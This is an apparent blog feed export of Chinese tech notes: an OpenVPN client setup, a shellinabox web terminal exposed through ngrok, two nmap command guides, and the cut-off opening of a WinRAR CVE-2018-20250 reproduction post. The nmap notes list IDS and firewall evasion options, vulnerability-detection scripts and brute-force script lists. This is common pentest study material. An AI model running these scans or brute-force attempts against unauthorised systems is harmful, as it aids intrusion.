class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ca.crt</span><br><span class="line">ta.key </span><br><span class="line">client.crt </span><br><span class="line">client.key </span><br><span class="line">client.conf</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554434147405.png" alt="1554434147405"></p><p>打开client.conf 将<code>remote my-server-1 1194</code>中<code>my-server-1</code> <code>1194</code>替换为服务器的ip/域名，端口，并去掉前面的分号</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554434551477.png" alt="1554434551477"></p><p>去掉前面的分号</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554434461184.png" alt="1554434461184"></p><p>设置证书地址,如果自定义了客户端证书名称自行更改</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554434518742.png" alt="1554434518742"></p><p>删掉分号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;tls-auth ta.key 1</span><br></pre></td></tr></table></figure><p>并在下一行添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key-direction 1</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554434639408.png" alt="1554434639408"></p><p>把client.conf命名为client.ovpn，然后将<strong>ca.crt ta.key client.crt client.key client.ovpn</strong>复制到客户端配置文件目录（此为windows环境下）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\OpenVPN\config</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554434791663.png" alt="1554434791663"></p><h2 id="九、连接测试"><a href="#九、连接测试" class="headerlink" title="九、连接测试"></a>九、连接测试</h2><p>客户端可访问官网（需要FQ），或者通过第三方渠道下载安装</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554435021629.png" alt="1554435021629"></p><p>如图连接成功</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554438169932.png" alt="1554438169932"></p><p>以上就是openvpn服务的搭建过程，如有不对遗漏之处，还望斧正，谢谢。</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ubuntu </tag>
            
            <tag> OpenVPN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web终端之shellinabox（配合ngrok远程登陆）</title>
      <link href="/2019/03/21/Web%E7%BB%88%E7%AB%AF%E4%B9%8Bshellinabox%EF%BC%88%E9%85%8D%E5%90%88ngrok%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86%EF%BC%89/"/>
      <url>/2019/03/21/Web%E7%BB%88%E7%AB%AF%E4%B9%8Bshellinabox%EF%BC%88%E9%85%8D%E5%90%88ngrok%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p>Shellinabox 是一个基于 web 的终端模拟器，采用 C 语言编写，使用 Ajax 与后端服务通信。它实现了一个 Webserver，默认监听 4200 端口，在支持 Javascript 和 CSS 的浏览器上访问 <a href="http://host:4200" target="_blank" rel="noopener">http://host:4200</a> 即可。并且可以配置 SSL/TLS 证书，使用 https 方式加密通信。</p><h2 id="二、安装"><a href="#二、安装" class="headerlink" title="二、安装"></a>二、安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install shellinabox#Debian系</span><br><span class="line">yum install shellinabox#RHEL系</span><br></pre></td></tr></table></figure><h2 id="三、启动"><a href="#三、启动" class="headerlink" title="三、启动"></a>三、启动</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shellinaboxd -h#查看帮助信息</span><br><span class="line">shellinaboxd -b -t  #运行</span><br><span class="line">-b#在后台运行</span><br><span class="line">-t#使用基于http协议的终端</span><br></pre></td></tr></table></figure><a id="more"></a><p><strong>查看端口</strong></p><p>查看进程，是否启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ntulp | grep shellinabox</span><br></pre></td></tr></table></figure><h2 id="四、配置"><a href="#四、配置" class="headerlink" title="四、配置"></a>四、配置</h2><h3 id="1-创建普通用户"><a href="#1-创建普通用户" class="headerlink" title="1. 创建普通用户"></a>1. 创建普通用户</h3><p>默认禁用root登陆，需要创建一个普通用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd username</span><br></pre></td></tr></table></figure><h3 id="2-修改配置文件"><a href="#2-修改配置文件" class="headerlink" title="2. 修改配置文件"></a>2. 修改配置文件</h3><p>可以需修改端口，或其他配置选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/default/shellinabox</span><br></pre></td></tr></table></figure><h2 id="五、登陆"><a href="#五、登陆" class="headerlink" title="五、登陆"></a>五、登陆</h2><p>局域网内访问  <a href="ip:4200" target="_blank" rel="noopener">ip:4200</a></p><p>输入用户名密码即可登陆</p><h2 id="六、内网映射（可选）"><a href="#六、内网映射（可选）" class="headerlink" title="六、内网映射（可选）"></a>六、内网映射（可选）</h2><h3 id="1-使用ngrok"><a href="#1-使用ngrok" class="headerlink" title="1.使用ngrok"></a>1.使用ngrok</h3><p><strong>使用ngrok，将基于WEB的终端映射到公网</strong></p><ol><li>访问<a href="https://www.ngrok.cc/user.html" target="_blank" rel="noopener">https://www.ngrok.cc/user.html</a> 注册 登录 找到”开通隧道”；</li><li>选择  <code>香港Ngrok免费服务器</code> ,在接下来的界面中选择隧道协议 <code>http</code> ,名称<code>shellinabox</code>（可随便填），前置域名 (不冲突即可)，本地端口(IP:PORT)被转发的ip和端口（不要填127.0.0.1），用户名密码可选填</li><li>在隧道管理中可以看到刚才建立的隧道，需要关注 <code>隧道ID</code>  <code>本地端口</code> 以及<code>域名</code> ，然后去下载Ngrok客户端</li><li>下载linux客户端，./sunny clientid 隧道ID</li><li>然后等待该隧道的建立  访问域名即可</li></ol><p><strong>ngrok.cc详细使用教程：<a href="http://www.ngrok.cc/_book/" target="_blank" rel="noopener">http://www.ngrok.cc/_book/</a></strong></p><h3 id="2-使用frp"><a href="#2-使用frp" class="headerlink" title="2.使用frp"></a>2.使用frp</h3><h3 id="3-使用花生壳"><a href="#3-使用花生壳" class="headerlink" title="3.使用花生壳"></a>3.使用花生壳</h3><p>可去官网开通    <a href="https://hsk.oray.com/" target="_blank" rel="noopener">https://hsk.oray.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellinabox </tag>
            
            <tag> ngrok </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap基础命令</title>
      <link href="/2019/03/16/nmap%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
      <url>/2019/03/16/nmap%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p><strong>nmap (network mapper)</strong> 最早是Linux中扫描和嗅探工具，网络连接端扫描工具，主要是探测目标机器上开启的服务、安全性问题、主机存活等等</p><h2 id="二、基本功能"><a href="#二、基本功能" class="headerlink" title="二、基本功能"></a>二、基本功能</h2><ol><li>探测机器存活情况；（是否开机）</li><li>扫端口；（服务）</li><li>扫描目标机器系统类型；（OS类型：NT/Linux）</li></ol><h2 id="三、高级用法；"><a href="#三、高级用法；" class="headerlink" title="三、高级用法；"></a>三、高级用法；</h2><ol><li>扫描目标机器上的安全漏洞；</li></ol><a id="more"></a><h2 id="四、nmap安装"><a href="#四、nmap安装" class="headerlink" title="四、nmap安装"></a>四、nmap安装</h2><h2 id="五、配置环境变量"><a href="#五、配置环境变量" class="headerlink" title="五、配置环境变量"></a>五、配置环境变量</h2><h2 id="六、基本用法"><a href="#六、基本用法" class="headerlink" title="六、基本用法"></a>六、基本用法</h2><p><strong>命令行模式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap -h #帮助信息</span><br><span class="line">nmap [扫描类型] [选项] [目标]</span><br><span class="line">nmap 192.168.1.100#对单个目标进行扫描</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.11.1</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure><p>端口状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">open</span><br><span class="line">closed</span><br><span class="line">filtered #被过滤的，探测包被拦截，无法定位该端口是否开启</span><br><span class="line">unfiltered #未过滤的，探测包没有被拦截，但是nmap还是无法判断该端口是否开启</span><br><span class="line">open|filtered #开放或者被过滤</span><br><span class="line">close|filtered#关闭或者被过滤</span><br></pre></td></tr></table></figure><p>批量扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.11.0/24#扫描整个网段</span><br><span class="line">nmap 192.179.1.1-200#扫描1-200之间的主机</span><br><span class="line">nmap 192.167.1.1,2,7-40</span><br><span class="line">nmap 192.168.168.1.0/24 192.10.1.3.1-200#多网段扫描</span><br></pre></td></tr></table></figure><p>文件扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 192.168.10.11 &gt; titlename</span><br><span class="line">nmap iL titlename（扫描文件）</span><br></pre></td></tr></table></figure><p>随机选择目标 nmap -iR ，例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -PS80 -iR 0（无休止去扫描） -p80</span><br></pre></td></tr></table></figure><p>排除扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.0/24 --exculde 192.168.1.1,255,4-10</span><br><span class="line">   --exculde 排除主机/网络</span><br><span class="line">nmap -iL scan_file(要扫的目标) --exculdefile noscan_file(不需要扫)</span><br></pre></td></tr></table></figure><h2 id="七、带有参数的扫描"><a href="#七、带有参数的扫描" class="headerlink" title="七、带有参数的扫描"></a>七、带有参数的扫描</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-s（Scan）</span><br><span class="line">-T（TCP）</span><br><span class="line"></span><br><span class="line">nmap -sT 使用-sT实现TCP全连接扫描，扫描过程中有三次握手</span><br><span class="line">建立连接 则表明端口开放 扫描速度慢</span><br><span class="line"></span><br><span class="line">nmap -sS 192.168.1.1 使用syn的数据包去探测,如果收到ACK，则说明端口开放</span><br><span class="line">nmap -sN -p- 192.168.1.1 NULL扫描，不设置任何控制位</span><br><span class="line">-p 端口 1-1000-p-所有端口</span><br><span class="line">-p20,21,22,23,24,25</span><br><span class="line"></span><br><span class="line">nmap -sV 192.168.1.1-V 探测服务的版本</span><br><span class="line"></span><br><span class="line">将结果写入到文件中</span><br><span class="line">nmap 192.168.1.1 &gt;./result.txt</span><br><span class="line">nmap  -sV 192.168.10.5 -oX  result.html</span><br><span class="line"></span><br><span class="line">nmap -A 192.168.1.1 所有扫描结果的详细信息 全面扫描</span><br><span class="line">nmap -O 192.168.1.1 显示操作系统信息</span><br></pre></td></tr></table></figure><h2 id="八、高级用法"><a href="#八、高级用法" class="headerlink" title="八、高级用法"></a>八、高级用法</h2><p><strong>扫描安全漏洞</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">--script使用脚本探测漏洞</span><br><span class="line">nmap --script脚本名称 目标</span><br><span class="line">在nmap的安装路径中有 /script/</span><br><span class="line">在该目录中存放nmap的脚本</span><br><span class="line"></span><br><span class="line">nmap --script smb-vuln-ms17-010 192.168.11.232</span><br><span class="line">永恒之蓝</span><br><span class="line"></span><br><span class="line">nmap --script smb-check-vulns 192.168.11.232</span><br><span class="line">MS08-067（SMB）溢出漏洞</span><br><span class="line"></span><br><span class="line">nmap --script ssl-heartbleed 192.168.11.232</span><br><span class="line">探测心脏滴血漏洞</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap笔记</title>
      <link href="/2019/03/16/nmap%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/03/16/nmap%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p><strong>nmap (network mapper)</strong> 最早是Linux中扫描和嗅探工具，网络连接端扫描工具，主要是探测目标机器上开启的服务、安全性问题、主机存活等等</p><h2 id="二、基本功能"><a href="#二、基本功能" class="headerlink" title="二、基本功能"></a>二、基本功能</h2><ol><li>主机探测；（是否开机）</li><li>服务版本检测；（端口）</li><li>操作系统检测；（OS类型：NT/Linux）</li><li>网络路由跟踪；</li><li>扫描目标机器上的安全漏洞。（脚本引擎NSE）</li></ol><a id="more"></a><h2 id="三、nmap安装"><a href="#三、nmap安装" class="headerlink" title="三、nmap安装"></a>三、nmap安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get isntall nmap</span><br></pre></td></tr></table></figure><h2 id="四、基本用法"><a href="#四、基本用法" class="headerlink" title="四、基本用法"></a>四、基本用法</h2><p>默认情况下，，nmap通过4种方式 — ICMP echo请求（ping）、向443端口发送SYN包、向80端口发送TCP ACK包和ICMP时间戳请求。</p><p><strong>命令行模式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -h #帮助信息</span><br><span class="line">nmap [扫描类型] [选项] [目标]</span><br><span class="line">nmap 192.168.1.100#对单个目标进行扫描</span><br></pre></td></tr></table></figure><p>端口状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">open#受理TCP连接、接收UDP数据包或者响应SCTP（流控制传输协议）请求</span><br><span class="line">closed#可以访问端口，但是没有应用程序工作在该端口上</span><br><span class="line">filtered#被过滤的，探测包被包过滤设备屏蔽</span><br><span class="line">unfiltered#未过滤的，不确定是否开放</span><br><span class="line">open|filtered#没有响应，可能是防火墙丢弃数据包</span><br><span class="line">close|filtered#关闭或者被过滤</span><br></pre></td></tr></table></figure><p>批量扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.11.0/24#扫描整个网段</span><br><span class="line">nmap 192.179.1.1-200#扫描1-200之间的主机</span><br><span class="line">nmap 192.167.1.1,2,7-40#十进制的IP区间</span><br><span class="line">nmap 192.168.168.1.0/24 192.10.1.3.1-200#多网段扫描</span><br></pre></td></tr></table></figure><p>文件扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 192.168.10.11 &gt; titlename</span><br><span class="line">nmap iL titlename（扫描文件）</span><br></pre></td></tr></table></figure><p>随机选择目标 nmap -iR ，例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -PS80 -iR 0（无休止去扫描） -p80</span><br></pre></td></tr></table></figure><p>排除扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.0/24 --exculde 192.168.1.1,255,4-10</span><br><span class="line">   --exculde 排除主机/网络</span><br><span class="line">nmap -iL scan_file(要扫的目标) --exculdefile noscan_file(不需要扫)</span><br></pre></td></tr></table></figure><h2 id="五、带有参数的扫描"><a href="#五、带有参数的扫描" class="headerlink" title="五、带有参数的扫描"></a>五、带有参数的扫描</h2><p><strong>TCP扫描</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-s（Scan）-T（TCP）</span><br><span class="line">nmap -sT 192.168.1.1</span><br><span class="line">#使用-sT实现TCP全连接扫描，扫描过程中有三次握手，建立连接则表明端口开放，扫描速度慢，很有可能被目标主机记录下来，低权限默认选项</span><br><span class="line">nmap -sS 192.168.1.1 </span><br><span class="line">#使用syn的数据包去探测,如果收到ACK，则说明端口开放，扫描速度快，比较隐蔽，高权限默认选项</span><br><span class="line">nmap -sN -p- 192.168.1.1 NULL扫描，不设置任何控制位</span><br><span class="line">默认随机1000-p 1-1000-p 20,21,22,23,24,25-p-所有端口</span><br><span class="line">nmap -sF 192.168.1.1#FIN扫描仅设置FIN标志位</span><br><span class="line">nmap -sX 192.168.1.1#XMAS扫描，设置FIN、PSH、URG的标识位，返回RST响应即端口关闭，无响应即打开|过滤状态</span><br><span class="line">nmap -sM 192.168.1.1#对于BSD衍生版本，回复RST响应即端口关闭，端口开放会丢弃</span><br><span class="line">nmap -sA 192.168.1.1#确定哪些端口被防火墙屏蔽，只有ACK标识位，回复RST，则没有被过滤</span><br><span class="line">nmap -sW 192.168.1.1#TCP窗口扫描，检测目标返回的RST数据包中的TCP窗口字段，端口开放为正值，关闭为0</span><br><span class="line">nmap -sI 192.168.1.1#通过指定的僵尸主机发送扫描数据包，本机不与目标主机通信</span><br></pre></td></tr></table></figure><p><strong>UDP扫描</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU 192.168.1.1 -p 53,161#非常慢，所以可以指定端口扫描</span><br></pre></td></tr></table></figure><p>改善扫描速度主要有：</p><ul><li>进行并发的UDP扫描</li><li>优先扫描常用端口</li><li>防火墙后面扫描</li><li>启用–host-time选项跳过响应过慢的主机</li></ul><p><strong>保存输出</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.1 -oN #交互输出，不显示runtime信息和警告信息</span><br><span class="line">nmap 192.168.1.1 &gt;./result.txt#将结果写入到文件中</span><br><span class="line">nmap 192.168.1.1 -oX result.xml#XML格式，可被Nmap图形界面解析，也方便导入数据库</span><br><span class="line">nmap 192.168.1.1 -oG#方便grep和awk整理扫描结果</span><br><span class="line">nmap 192.168.1.1 -oA#三种方式输出</span><br><span class="line">xsltproc result.xml -o result.html#xml转换为html</span><br></pre></td></tr></table></figure><p><strong>时间控制</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nmap -T 0 192.168.1.1#每5分钟发送一次数据包，且不会并行发送多组数据，不会被IDS检测到</span><br><span class="line">nmap -T 1 192.168.1.1#每15秒发送一次数据包，且不会并行发送多组数据</span><br><span class="line">nmap -T 2 192.168.1.1#每0.4秒发送一次数据包，且不会并行发送多组数据</span><br><span class="line">nmap -T 3 192.168.1.1#默认模式，同时向多个目标发送多个数据包，自动在扫描时间和网络负载之间平衡</span><br><span class="line">nmap -T 4 192.168.1.1#对每个目标只扫描5分钟，然后扫描下一台，等待响应时间不超过1.25秒</span><br><span class="line">nmap -T 5 192.168.1.1#对每个目标只扫描75秒，然后扫描下一台，等待响应时间不超过0.3秒</span><br><span class="line">无特殊需求，默认即可</span><br></pre></td></tr></table></figure><p><strong>常用选项</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.1.1#服务版本识别</span><br><span class="line">nmap -O 192.168.1.1 #操作系统检测</span><br><span class="line">nmap -Pn 192.168.1.1#主机屏蔽ping请求，禁用主机检测功能，直接进行扫描</span><br><span class="line">nmap -A 192.168.1.1 #强力检测，服务版本(-sV)，操作系统(-o)，脚本(-sC)，路由(--traceroute)</span><br></pre></td></tr></table></figure><p>扫描IPv6主机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -6 IPv6地址#只能逐个指定目标进行扫描，端口比IPv4要少，部分服务未支持IPv6</span><br></pre></td></tr></table></figure><p>规避IDS/防火墙检测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-f;--mtu#使用&lt;=8字节数据体的数据包;mtu调整数据包大小，必须是8的整数倍</span><br><span class="line">-D &lt;decoy1,decoy2,ME&gt;RND: number(个数)</span><br><span class="line">#掺杂伪装假IP，掩盖真实IP，RND随机生成，越往后越好，需要伪装成在线主机，否则容易造成网络拥堵；可以用在ping扫描，端口扫描，操作系统检测，不可用于版本检测和TCP连接扫描</span><br><span class="line">-S &lt;IP_Address&gt;#源地址哄骗</span><br><span class="line">-e &lt;interface&gt;#指定网卡接口</span><br><span class="line">--source-port&lt;portnumber&gt;/-g(模拟源端口)#防火墙限制入站流量使用</span><br><span class="line">--data-length#改变发送数据包的默认长度，比年被识别出是nmap扫描</span><br><span class="line">--max-parallelism#限制Nmap并发扫描最大连接数</span><br><span class="line">--scan-delay &lt;time&gt;#控制发送探测数据的时间间隔，避免达到IDS/IPS端口扫描规则的阈值</span><br><span class="line">--data-length &lt;number&gt;#发送报文时 附加随机数据</span><br><span class="line">--randomize-hosts#对目标主机的顺序随机排列</span><br><span class="line">--spoof-mac &lt;mac address，prefix，or vendor name&gt;#MAC地址哄骗</span><br></pre></td></tr></table></figure><p>官方文档：<a href="https://nmap.org/man/zh/man-bypass-firewalls-ids.html" target="_blank" rel="noopener">https://nmap.org/man/zh/man-bypass-firewalls-ids.html</a></p><h2 id="六、高级用法"><a href="#六、高级用法" class="headerlink" title="六、高级用法"></a>六、高级用法</h2><p><strong>脚本引擎，扫描安全漏洞</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">--script#使用脚本探测漏洞</span><br><span class="line">nmap --script#脚本名称 目标</span><br><span class="line">#在nmap的安装路径中有 /script/</span><br><span class="line">#在该目录中存放nmap的脚本</span><br><span class="line">nmap -sC/-A/--script=default 192.168.1.1#启动默认类NSE脚本</span><br><span class="line">nmap --script=vuln 203.207.118.201#自动测试漏洞</span><br><span class="line">nmap 目标 --script=auth,vuln  #判断常见的漏洞并扫描端口</span><br><span class="line">nmap --script http-enum,http-headers,http-methods,http-php-version -p 80 192.168.1.1</span><br><span class="line">#分析HTTP服务</span><br><span class="line">nmap --script smb-vuln-ms17-010 192.168.11.232#永恒之蓝</span><br><span class="line">nmap --script smb-check-vulns 192.168.11.232#MS08-067（SMB）溢出漏洞</span><br><span class="line">nmap --script ssl-heartbleed 192.168.11.232#探测心脏滴血漏洞</span><br><span class="line"></span><br><span class="line">nmap 目标 --script=ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute#扫描端口并且标记可以爆破的服务</span><br><span class="line"></span><br><span class="line">nmap 目标 --script=dns-zone-transfer,ftp-anon,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,http-backup-finder,http-cisco-anyconnect,http-iis-short-name-brute,http-put,http-php-version,http-shellshock,http-robots.txt,http-svn-enum,http-webdav-scan,iis-buffer-overflow,iax2-version,memcached-info,mongodb-info,msrpc-enum,ms-sql-info,mysql-info,nrpe-enum,pptp-version,redis-info,rpcinfo,samba-vuln-cve-2012-1182,smb-vuln-ms08-067,smb-vuln-ms17-010,snmp-info,sshv1,xmpp-info,tftp-enum,teamspeak2-version#精确判断漏洞并扫描端口</span><br><span class="line"></span><br><span class="line">nmap -iL host.txt --script=auth,vuln,ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute &gt; scan.txt</span><br></pre></td></tr></table></figure><p>参考：</p><p>Nmap参考指南(真香)：<a href="https://nmap.org/man/zh/index.html#man-description" target="_blank" rel="noopener">https://nmap.org/man/zh/index.html#man-description</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-20250-WinRAR远程代码执行漏洞</title>
      <link href="/2019/03/16/CVE-2018-20250-WinRAR%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/03/16/CVE-2018-20250-WinRAR%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>WinRAR 代码执行相关的CVE 编号如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2018-20250,CVE-2018-20251, CVE-2018-20252, CVE-2018-20253</span><br></pre></td></tr></table></figure><p>这里我们复现最开始的WinRAR目录穿越漏洞（CVE-2018-20250）。</p><h2 id="二、漏洞详情"><a href="#二、漏洞详情" class="headerlink" title="二、漏洞详情"></a>二、漏洞详情</h2><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1. 原理"></a>1. 原理</h3><p>WinRAR目录穿越漏洞（CVE-2018-20250）：</p><p>​    该漏洞是由于WinRAR 所使用的一个陈旧的动态链接库UNACEV2.dll所造成的，该动态链接库在2006 年被编译，没有任何的基础保护机制(ASLR,DEP 等)。该动态链接库的作用是处理ACE 格式文件。而在解压处理过程中存在一处目录穿越漏洞,允许解压过程写入文件至开机启动项，导致代码执行。</p><a id="more"></a><p><em>漏洞细节</em>: <a 